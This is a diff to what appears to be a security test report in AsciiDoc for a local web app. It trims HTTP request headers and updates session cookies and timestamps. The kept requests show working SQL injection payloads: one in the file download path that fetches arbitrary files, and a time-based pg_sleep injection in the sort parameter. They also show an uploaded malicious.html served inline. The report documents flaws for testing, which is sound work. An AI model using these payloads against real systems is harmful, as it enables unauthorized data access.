@@ -38,31 +38,7 @@ Verify that logout and expiration invalidate the session token, such that the ba
 
 ==== Prerequisites
 
-===== User has a valid account
-
-[source,http]
-.HTTP POST /signup request
-----
-POST /signup HTTP/1.1
-Host: 0.0.0.0:8070
-Content-Length: 323
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
-
-------WebKitFormBoundary7MA4YWxkTrZu0gW
-Content-Disposition: form-data; name="username"
-
-x
-------WebKitFormBoundary7MA4YWxkTrZu0gW
-Content-Disposition: form-data; name="password"
-
-x
-------WebKitFormBoundary7MA4YWxkTrZu0gW
-Content-Disposition: form-data; name="confirm_password"
-
-x
-------WebKitFormBoundary7MA4YWxkTrZu0gW--
-----
-
+. User has a valid account.
 
 ===== User logs in to the webpage and receives a session cookie
 
@@ -87,7 +63,7 @@ x
 ----
 
 [source, HTTP]
-.HTTP POST /login response (without body)
+.HTTP POST /login response headers
 ----
 HTTP/1.1 200 OK
 Hx-Redirect: /files
@@ -258,23 +234,18 @@ Download file request is vulnerable to SQL injection and allows to download any 
 [source, HTTP]
 .HTTP GET /files/1 OR '1'='1' ORDER BY name LIMIT 1 OFFSET 1;--" request header
 ----
-GET /files/1%20OR%20'1'='1'%20ORDER%20BY%20name%20LIMIT%201%20OFFSET%201;-- HTTP/1.1
-User-Agent: PostmanRuntime/7.43.0
-Accept: */*
-Postman-Token: 6bb3242f-ca34-4956-a37e-83e8a360419e
+GET /files/1 OR '1'='1' ORDER BY name LIMIT 1 OFFSET 1;-- HTTP/1.1
 Host: 0.0.0.0:8070
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-Cookie: session=MTczNDM3MjA0OHxEWDhFQVFMX2dBQUJFQUVRQUFBZ180QUFBUVp6ZEhKcGJtY01DUUFIZFhObGNsOXBaQVZwYm5Rek1nUUNBQlE9fDOkN2idNF_fuspPH9w7okbnWlAmEsszTsxMZQHtn2RP
+Cookie: session=MTczNDM3OTc1NXxEWDhFQVFMX2dBQUJFQUVRQUFBZ180QUFBUVp6ZEhKcGJtY01DUUFIZFhObGNsOXBaQVZwYm5Rek1nUUNBQlE9fOEFU2YXZiKWD9CBaEhdvcjurMOkUCbfGHv-Pw8pwUYX
 ----
 
 [source, HTTP]
 .HTTP GET /files/1 OR '1'='1' ORDER BY name LIMIT 1 OFFSET 1;--" response header
 ----
 HTTP/1.1 200 OK
-Content-Disposition: attachment; filename="5433.732000.jpg"
+Content-Disposition: attachment; filename="5433.612000.jpg"
 Content-Type: image/jpeg
-Date: Mon, 16 Dec 2024 18:01:08 GMT
+Date: Mon, 16 Dec 2024 20:09:27 GMT
 Transfer-Encoding: chunked
 ----
 
@@ -289,14 +260,9 @@ Table sorting is not enumerated and is vulnerable to SQL injection. This can be 
 [source, HTTP]
 .HTTP GET /files?sort=name, (SELECT 1 FROM pg_sleep(30)) request
 ----
-GET /files?sort=name,%20(SELECT%201%20FROM%20pg_sleep(30)) HTTP/1.1
-User-Agent: PostmanRuntime/7.43.0
-Accept: */*
-Postman-Token: 3c98bbc3-397d-4fe4-bc99-4f85309c3845
+GET /files?sort=name, (SELECT 1 FROM pg_sleep(30)) HTTP/1.1
 Host: 0.0.0.0:8070
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-Cookie: session=MTczNDM3MjA0OHxEWDhFQVFMX2dBQUJFQUVRQUFBZ180QUFBUVp6ZEhKcGJtY01DUUFIZFhObGNsOXBaQVZwYm5Rek1nUUNBQlE9fDOkN2idNF_fuspPH9w7okbnWlAmEsszTsxMZQHtn2RP
+Cookie: session=MTczNDM3OTc1NXxEWDhFQVFMX2dBQUJFQUVRQUFBZ180QUFBUVp6ZEhKcGJtY01DUUFIZFhObGNsOXBaQVZwYm5Rek1nUUNBQlE9fOEFU2YXZiKWD9CBaEhdvcjurMOkUCbfGHv-Pw8pwUYX
 ----
 
 Request took `30.04 seconds` to respond.
@@ -306,7 +272,7 @@ Request took `30.04 seconds` to respond.
 .HTTP GET /files?sort=name, (SELECT 1 FROM pg_sleep(30)) response
 ----
 HTTP/1.1 200 OK
-Date: Mon, 16 Dec 2024 18:10:45 GMT
+Date: Mon, 16 Dec 2024 20:11:43 GMT
 Content-Type: text/html; charset=utf-8
 Transfer-Encoding: chunked
 ----
@@ -350,13 +316,8 @@ name it `malicious.html`.
 .HTTP GET /files/{file_id} request
 ----
 GET /files/41 HTTP/1.1
-User-Agent: PostmanRuntime/7.43.0
-Accept: */*
-Postman-Token: 26214bc8-9480-4ac4-b924-468c6451027c
 Host: 0.0.0.0:8070
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-Cookie: session=MTczNDM3MzU2MnxEWDhFQVFMX2dBQUJFQUVRQUFBZ180QUFBUVp6ZEhKcGJtY01DUUFIZFhObGNsOXBaQVZwYm5Rek1nUUNBQlE9fJbsqMxb2Brh-Jmdc8dom9f8DU7oSfSQOtHbEx1I2L9j
+Cookie: session=MTczNDM3OTc1NXxEWDhFQVFMX2dBQUJFQUVRQUFBZ180QUFBUVp6ZEhKcGJtY01DUUFIZFhObGNsOXBaQVZwYm5Rek1nUUNBQlE9fOEFU2YXZiKWD9CBaEhdvcjurMOkUCbfGHv-Pw8pwUYX
 ----
 
 [source, HTTP]
@@ -365,7 +326,7 @@ Cookie: session=MTczNDM3MzU2MnxEWDhFQVFMX2dBQUJFQUVRQUFBZ180QUFBUVp6ZEhKcGJtY01D
 HTTP/1.1 200 OK
 Content-Disposition: inline; filename="malicious.html"
 Content-Type: text/html
-Date: Mon, 16 Dec 2024 18:29:03 GMT
+Date: Mon, 16 Dec 2024 20:14:08 GMT
 Content-Length: 31
 ----
 
